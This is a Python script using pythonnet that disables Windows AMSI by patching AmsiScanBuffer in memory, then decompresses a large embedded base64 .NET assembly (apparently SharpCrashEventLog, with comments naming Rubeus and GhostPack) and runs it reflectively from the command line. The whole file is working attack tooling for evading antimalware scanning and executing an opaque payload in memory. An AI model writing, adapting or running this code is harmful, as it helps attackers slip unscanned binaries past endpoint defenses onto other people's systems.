import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpCrashEventLog.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()